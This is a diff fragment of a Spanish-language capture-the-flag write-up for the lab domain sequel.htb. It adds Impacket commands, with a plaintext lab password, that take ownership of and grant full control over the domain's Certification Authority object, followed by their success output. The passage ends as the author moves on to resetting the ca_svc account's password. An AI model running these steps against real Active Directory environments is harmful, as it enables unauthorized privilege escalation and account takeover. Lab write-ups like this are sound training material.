@@ -722,9 +722,33 @@ sAMAccountType: 805306368
 userPrincipalName: ca_svc@sequel.htb
 servicePrincipalName: sequel.htb/ca_svc.DC01
 ```
+con esta información ajuste mi comando y logre ejecutarlo con éxito
 
-con esta información ajuste mi comando y logre ejecutarlo con exito
+```bash
+impacket-owneredit -action write -new-owner 'ryan' -target-dn 'CN=Certification Authority,CN=Users,DC=sequel,DC=htb' sequel.htb/ryan:'WqSZAF6CysDQbGb3'  -dc-ip 10.10.11.51  
+```
 
+```bash
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
+[*] OwnerSid modified successfully!
+```
+Posteriormente otroge el control total
+
+```bash
+impacket-dacledit -action write -rights 'FullControl' -principal 'ryan' -target-dn 'CN=Certification Authority,CN=Users,DC=sequel,DC=htb' sequel.htb/ryan:'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51
+```
+
+```bash
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] DACL backed up to dacledit-20250703-024336.bak
+[*] DACL modified successfully!
+```
 Por ultimo cambie la contraseña del usuario `ca_svc`
 
 ```bash
